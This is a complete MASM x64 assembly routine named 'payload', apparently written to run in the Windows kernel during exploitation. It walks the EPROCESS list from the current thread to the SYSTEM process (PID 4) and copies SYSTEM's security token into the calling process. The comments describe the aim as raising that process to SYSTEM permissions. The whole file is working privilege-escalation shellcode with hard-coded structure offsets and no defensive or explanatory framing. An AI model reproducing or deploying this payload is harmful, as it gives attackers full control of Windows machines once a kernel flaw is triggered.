.code
payload proc
	; Save utilized register values
	push rax
	push rbx
	; _KPCR -> _BPRCB -> _KTHREAD (Current thread)
	xor rax, rax
	mov rax, gs:[rax + 188h]
	
	; _KTHREAD -> _EPROCESS
	mov rax, [rax + 70h]

	; Save current _EPROCESS address and loop through processes for PID 4 (system process)
	mov rbx, rax

CheckSystem:
	mov rax, [rax + 188h]
	sub rax, 188h
	cmp qword ptr [rax + 180h], 4
	jne CheckSystem

	; Copy system security token to our process to raise our permissions to system
	mov rax, [rax + 208h]
	mov [rbx + 208h], rax
	
	; Restore registers and return program execution
	pop rbx
	pop rax
	ret
payload endp
end